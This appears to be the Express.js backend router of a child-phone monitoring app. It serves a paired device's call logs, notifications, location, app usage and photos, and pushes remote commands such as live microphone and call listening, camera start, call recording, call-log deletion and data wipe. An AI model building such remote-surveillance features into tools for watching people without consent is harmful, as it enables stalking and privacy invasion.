const express = require('express');
const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo } = require('../models');
const { protect } = require('./auth');
const admin = require('firebase-admin');

const router = express.Router();

// Helper function to transform device for API response
const transformDevice = (device) => {
  const d = device.toObject ? device.toObject() : device;
  return {
    id: d._id.toString(),
    deviceId: d.deviceId,
    name: d.name,
    model: d.model,
    androidVersion: d.androidVersion,
    isOnline: d.isOnline,
    batteryLevel: d.battery || 0,
    screenTime: d.screenTime || 0,
    lastSeen: d.lastSeen ? new Date(d.lastSeen).getTime() : 0,
    location: d.location,
    blockedApps: d.blockedApps || [],
    settings: d.settings,
    permissions: d.permissions || {
      location: false,
      backgroundLocation: false,
      camera: false,
      microphone: false,
      storage: false,
      callLog: false,
      contacts: false,
      sms: false,
      phone: false,
      notifications: false,
      usageStats: false,
      overlay: false,
      batteryOptimization: false,
      deviceAdmin: false,
      accessibility: false,
      lastUpdated: null
    }
  };
};

// Get all devices for current user
router.get('/', protect, async (req, res) => {
  try {
    const devices = await Device.find({ owner: req.user._id })
      .select('-__v')
      .sort({ lastSeen: -1 });
    
    res.json({
      success: true,
      count: devices.length,
      devices: devices.map(transformDevice)
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch devices' });
  }
});

// Get single device details
router.get('/:deviceId', protect, async (req, res) => {
  try {
    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    res.json({
      success: true,
      device: transformDevice(device)
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch device' });
  }
});

// Update device settings
router.put('/:deviceId/settings', protect, async (req, res) => {
  try {
    const { settings, blockedApps, name } = req.body;

    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    if (settings) device.settings = { ...device.settings, ...settings };
    if (blockedApps) device.blockedApps = blockedApps;
    if (name) device.name = name;

    await device.save();

    // Send settings update to device via FCM
    if (device.fcmToken) {
      try {
        await admin.messaging().send({
          token: device.fcmToken,
          data: {
            command: 'update_settings',
            settings: JSON.stringify(device.settings),
            blockedApps: JSON.stringify(device.blockedApps)
          }
        });
      } catch (fcmError) {
        console.error('FCM send error:', fcmError);
      }
    }

    res.json({
      success: true,
      device
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to update settings' });
  }
});

// Send command to device
router.post('/:deviceId/command', protect, async (req, res) => {
  try {
    const { command, params } = req.body;
    
    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    if (!device.fcmToken) {
      return res.status(400).json({ error: 'Device not registered for push notifications' });
    }

    // Valid commands
    const validCommands = [
      'start_screen_mirror',
      'stop_screen_mirror',
      'start_camera',
      'stop_camera',
      'start_live_listen',
      'stop_live_listen',
      'stop_stream',
      'sync_data',
      'delete_call_logs',
      'lock_device',
      'unlock_device',
      'ring_device',
      'stop_ring',
      'update_blocked_apps',
      'open_app',
      'sync_photos',
      'update_location',
      'record_audio',
      'enable_call_recording',
      'disable_call_recording',
      'live_call_listen',
      'get_location',
      'wipe_data',
      'uninstall_app'
    ];

    if (!validCommands.includes(command)) {
      return res.status(400).json({ error: 'Invalid command' });
    }

    // Check if Firebase is initialized
    if (!admin.apps.length) {
      console.warn('Firebase not initialized - cannot send command');
      return res.status(503).json({ 
        error: 'Push notifications not configured on server',
        details: 'Firebase Admin SDK credentials not set'
      });
    }

    // Send FCM message
    const message = {
      token: device.fcmToken,
      data: {
        command,
        params: params ? JSON.stringify(params) : '',
        timestamp: Date.now().toString()
      },
      android: {
        priority: 'high',
        ttl: 60000 // 1 minute
      }
    };

    await admin.messaging().send(message);

    res.json({
      success: true,
      message: `Command '${command}' sent to device`
    });
  } catch (error) {
    console.error('Command error:', error);
    res.status(500).json({ error: 'Failed to send command', details: error.message });
  }
});

// Delete device (unpair) - requires PIN if set
router.delete('/:deviceId', protect, async (req, res) => {
  try {
    // Check if user has security PIN set
    const { User } = require('../models');
    const user = await User.findById(req.user._id);
    
    if (user.securityPin) {
      const { pin } = req.body || {};
      if (!pin) {
        return res.status(400).json({ 
          error: 'Security PIN required',
          requiresPin: true 
        });
      }
      if (pin !== user.securityPin) {
        return res.status(401).json({ error: 'Invalid security PIN' });
      }
    }
    
    // First, find the device to get FCM token before deleting
    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }
    
    // Send FCM notification to unpair the child device
    if (device.fcmToken) {
      try {
        await admin.messaging().send({
          token: device.fcmToken,
          data: {
            command: 'unpair_device',
            timestamp: Date.now().toString()
          },
          android: {
            priority: 'high',
            ttl: 60000
          }
        });
        console.log('Unpair command sent to child device:', device.deviceId);
      } catch (fcmError) {
        console.error('Failed to send unpair FCM notification:', fcmError);
        // Continue with deletion even if FCM fails
      }
    }
    
    // Now delete the device
    await Device.findByIdAndDelete(device._id);

    // Remove from user's devices list
    await req.user.updateOne({
      $pull: { devices: device._id }
    });

    // Delete all associated data
    await Promise.all([
      Notification.deleteMany({ deviceId: device.deviceId }),
      CallLog.deleteMany({ deviceId: device.deviceId }),
      AppUsage.deleteMany({ deviceId: device.deviceId }),
      LocationHistory.deleteMany({ deviceId: device.deviceId })
    ]);

    res.json({
      success: true,
      message: 'Device removed successfully'
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to delete device' });
  }
});

// Get device notifications
router.get('/:deviceId/notifications', protect, async (req, res) => {
  try {
    const { limit = 50, skip = 0, app } = req.query;

    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const query = { deviceId: device.deviceId };
    if (app) query.packageName = new RegExp(app, 'i');

    const notifications = await Notification.find(query)
      .sort({ timestamp: -1 })
      .skip(parseInt(skip))
      .limit(parseInt(limit));

    const total = await Notification.countDocuments(query);

    res.json({
      success: true,
      total,
      notifications
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch notifications' });
  }
});

// Get device call logs
router.get('/:deviceId/call-logs', protect, async (req, res) => {
  try {
    const { limit = 50, skip = 0, type } = req.query;

    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const query = { deviceId: device.deviceId };
    if (type) query.type = type;

    const callLogs = await CallLog.find(query)
      .sort({ timestamp: -1 })
      .skip(parseInt(skip))
      .limit(parseInt(limit));

    const total = await CallLog.countDocuments(query);

    // Get stats
    const stats = await CallLog.aggregate([
      { $match: { deviceId: device.deviceId } },
      {
        $group: {
          _id: '$type',
          count: { $sum: 1 }
        }
      }
    ]);

    res.json({
      success: true,
      total,
      stats: stats.reduce((acc, s) => ({ ...acc, [s._id]: s.count }), {}),
      callLogs
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch call logs' });
  }
});

// Delete call logs from child device remotely
router.delete('/:deviceId/call-logs', protect, async (req, res) => {
  try {
    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    // Send command to device to delete call logs locally
    if (device.fcmToken) {
      await admin.messaging().send({
        token: device.fcmToken,
        data: {
          command: 'delete_call_logs',
          timestamp: Date.now().toString()
        },
        android: {
          priority: 'high'
        }
      });
    }

    // Delete from server database too
    await CallLog.deleteMany({ deviceId: device.deviceId });

    res.json({
      success: true,
      message: 'Call logs deletion command sent'
    });
  } catch (error) {
    console.error('Delete call logs error:', error);
    res.status(500).json({ error: 'Failed to delete call logs' });
  }
});

// Get device location history
router.get('/:deviceId/location', protect, async (req, res) => {
  try {
    const { limit = 100 } = req.query;

    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const locations = await LocationHistory.find({ deviceId: device.deviceId })
      .sort({ timestamp: -1 })
      .limit(parseInt(limit));

    res.json({
      success: true,
      currentLocation: device.location,
      history: locations
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch location' });
  }
});

// Get device app usage
router.get('/:deviceId/apps', protect, async (req, res) => {
  try {
    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    // Get today's app usage aggregated
    const today = new Date();
    today.setHours(0, 0, 0, 0);

    const appUsage = await AppUsage.aggregate([
      {
        $match: {
          deviceId: device.deviceId,
          date: { $gte: today }
        }
      },
      {
        $group: {
          _id: '$packageName',
          appName: { $first: '$appName' },
          totalTime: { $sum: '$usageTime' },
          openCount: { $sum: '$openCount' }
        }
      },
      { $sort: { totalTime: -1 } }
    ]);

    res.json({
      success: true,
      blockedApps: device.blockedApps,
      usage: appUsage
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch app usage' });
  }
});

// Get device photos/gallery (last 24 hours by default)
router.get('/:deviceId/photos', protect, async (req, res) => {
  try {
    const { hours = 24, limit = 50 } = req.query;

    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    // Calculate cutoff time
    const cutoffTime = new Date(Date.now() - (parseInt(hours) * 60 * 60 * 1000));

    const photos = await Photo.find({
      deviceId: device.deviceId,
      timestamp: { $gte: cutoffTime }
    })
    .sort({ timestamp: -1 })
    .limit(parseInt(limit))
    .select('-fullImageBase64'); // Don't send full images in list view

    const total = await Photo.countDocuments({
      deviceId: device.deviceId,
      timestamp: { $gte: cutoffTime }
    });

    res.json({
      success: true,
      total,
      photos: photos.map(p => ({
        id: p._id,
        fileName: p.fileName,
        thumbnail: p.thumbnailBase64,
        mimeType: p.mimeType,
        width: p.width,
        height: p.height,
        size: p.size,
        dateTaken: p.dateTaken,
        timestamp: p.timestamp
      }))
    });
  } catch (error) {
    console.error('Failed to fetch photos:', error);
    res.status(500).json({ error: 'Failed to fetch photos' });
  }
});

// Get single photo (full resolution)
router.get('/:deviceId/photos/:photoId', protect, async (req, res) => {
  try {
    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    const photo = await Photo.findOne({
      _id: req.params.photoId,
      deviceId: device.deviceId
    });

    if (!photo) {
      return res.status(404).json({ error: 'Photo not found' });
    }

    res.json({
      success: true,
      photo: {
        id: photo._id,
        fileName: photo.fileName,
        image: photo.fullImageBase64 || photo.thumbnailBase64,
        mimeType: photo.mimeType,
        width: photo.width,
        height: photo.height,
        size: photo.size,
        dateTaken: photo.dateTaken,
        timestamp: photo.timestamp
      }
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch photo' });
  }
});

// Request photo sync from device
router.post('/:deviceId/photos/sync', protect, async (req, res) => {
  try {
    const { hours = 24 } = req.body;

    const device = await Device.findOne({
      _id: req.params.deviceId,
      owner: req.user._id
    });

    if (!device) {
      return res.status(404).json({ error: 'Device not found' });
    }

    if (!device.fcmToken) {
      return res.status(400).json({ error: 'Device not connected' });
    }

    // Check if Firebase is initialized
    if (!admin.apps.length) {
      console.warn('Firebase not initialized - cannot send photo sync');
      return res.status(503).json({ 
        error: 'Push notifications not configured on server',
        details: 'Firebase Admin SDK credentials not set'
      });
    }

    // Send FCM to sync photos
    await admin.messaging().send({
      token: device.fcmToken,
      data: {
        command: 'sync_photos',
        hours: hours.toString()
      },
      android: {
        priority: 'high'
      }
    });

    res.json({
      success: true,
      message: 'Photo sync request sent to device'
    });
  } catch (error) {
    console.error('Failed to request photo sync:', error);
    res.status(500).json({ error: 'Failed to send sync request', details: error.message });
  }
});

module.exports = router;
